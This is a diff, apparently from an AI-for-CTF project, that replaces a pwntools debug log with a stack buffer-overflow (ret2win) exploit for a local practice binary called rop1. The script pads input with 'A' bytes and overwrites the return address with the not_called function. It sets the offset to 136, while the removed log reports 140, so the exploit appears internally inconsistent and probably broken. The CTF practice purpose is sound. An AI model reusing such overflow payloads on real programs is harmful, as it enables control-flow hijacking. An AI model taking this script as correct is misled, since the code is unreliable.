@@ -1,26 +1,26 @@
-[x] Starting local process './pwn/stack/rop-1/rop1'
-[+] Starting local process './pwn/stack/rop-1/rop1': pid 12061
-[*] Process './pwn/stack/rop-1/rop1' stopped with exit code -11 (SIGSEGV) (pid 12061)
-[x] Parsing corefile...
-[*] '/mnt/d/project/LLM4CTF/core.12061'
-    Arch:      i386-32-little
-    EIP:       0x6261616b
-    ESP:       0xffe58120
-    Exe:       '/mnt/d/project/LLM4CTF/pwn/stack/rop-1/rop1' (0x8048000)
-    Fault:     0x6261616b
-[+] Parsing corefile...: Done
-[*] EIP is overwritten with: 0x6261616b
-[+] Offset found: 140
-[*] '/mnt/d/project/LLM4CTF/pwn/stack/rop-1/rop1'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-[*] Address of not_called: 0x080484a4
-[x] Starting local process './pwn/stack/rop-1/rop1'
-[+] Starting local process './pwn/stack/rop-1/rop1': pid 12071
-[*] Switching to interactive mode
-hello world! Is there a error?
-[*] Stopped process './pwn/stack/rop-1/rop1' (pid 12071)
+from pwn import *
 
+# Path to the binary
+binary_path = './pwn/stack/rop-1/rop1'
+
+# Start the process
+io = process(binary_path)
+
+# Load the binary
+elf = ELF(binary_path)
+
+# Find the offset to the return address
+offset = 136  # Adjust this value based on your testing
+
+# Address of the 'not_called' function
+not_called_addr = elf.symbols['not_called']
+
+# Create the payload
+payload = b'A' * offset
+payload += p32(not_called_addr)
+
+# Send the payload
+io.sendline(payload)
+
+# Drop to an interactive shell
+io.interactive()
